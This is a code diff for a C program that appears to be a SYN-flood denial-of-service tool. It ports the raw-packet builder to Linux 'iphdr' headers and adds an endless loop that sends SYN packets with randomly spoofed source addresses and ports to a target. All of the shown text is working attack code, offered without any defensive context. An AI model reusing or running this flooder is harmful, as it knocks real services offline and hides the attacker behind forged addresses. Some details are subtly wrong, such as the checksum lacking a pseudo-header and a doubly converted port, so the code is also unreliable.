@@ -9,7 +9,7 @@
 #include <netinet/in.h>
 #include <netinet/ip.h>
 #include <arpa/inet.h>
-#include <linux/tcp.h>
+#include <netinet/tcp.h>
 
 uint16_t check_sum(uint16_t *addr, int len) {
   int nleft = len;
@@ -34,13 +34,13 @@ uint16_t check_sum(uint16_t *addr, int len) {
 void attack(int sockfd, struct sockaddr_in *target, unsigned short srcport) {
   char buf[128] = {0};
   //include in /usr/include/netinet/ip.h
-  struct ip *ip;
+  struct iphdr *ip;
   struct tcphdr *tcp;
   int ip_len;
 
-  ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
-  ip = (struct ip*) buf;
-
+  ip_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+  ip = (struct iphdr*) buf;
+/*
   ip -> ip_v = 4; //IPVERSION;
   ip -> ip_hl = sizeof(struct ip) >> 2;
   ip -> ip_tos = 0;
@@ -51,20 +51,46 @@ void attack(int sockfd, struct sockaddr_in *target, unsigned short srcport) {
   ip -> ip_p = IPPROTO_TCP;
   ip -> ip_sum = 0;
   ip -> ip_dst = target -> sin_addr;
+*/
+  ip -> ihl = 5;
+  ip -> version = 4;
+  ip -> tos = 0;
+  ip -> tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+  //ip -> id = htons((unsigned int)rand());
+  ip -> id = htons(54321);
+  ip -> frag_off = 0;
+  ip -> ttl = MAXTTL;
+  ip -> protocol = IPPROTO_TCP;
+  ip -> check = 0;
+  ip -> saddr = inet_addr("0.0.0.0");
+  ip -> daddr = target -> sin_addr.s_addr;
 
-  tcp = (struct tcphdr*)(buf + sizeof(struct ip));
-  tcp -> source = htons(srcport);
-  tcp -> dest = target -> sin_port;
-  tcp -> seq = random();
+  tcp = (struct tcphdr*)(buf + sizeof(struct iphdr));
+
+  tcp -> source = htons(0);
+  tcp -> dest = htons(target -> sin_port);
+  tcp -> seq = 0;
+  tcp -> ack_seq = 0;
+  tcp -> res1 = 0;
   tcp -> doff = sizeof(struct tcphdr) / 4;
+  tcp -> fin = 0;
   tcp -> syn = 1;
+  tcp -> rst = 0;
+  tcp -> psh = 0;
+  tcp -> ack = 0;
+  tcp -> urg = 0;
+  tcp -> res2 = 0;
+  tcp -> window = htons(65535);
   tcp -> check = 0;
+  tcp -> urg_ptr = 0;
 
   while(1) {
-    ip -> ip_src.s_addr = random();
-    tcp -> check = 0;
+    char ipbuf[16];
+    sprintf(ipbuf, "%d.%d.%d.%d", random()%255, random()%255, random()%255, random()%255);
+    ip -> saddr = inet_addr(ipbuf);
     tcp -> check = check_sum((u_short*)tcp, sizeof(struct tcphdr));
     tcp -> source = htons(random());
+    tcp -> seq = random();
     sendto(sockfd, buf, ip_len, 0, (struct sockaddr*)target, sizeof(struct sockaddr_in));
   }
 }
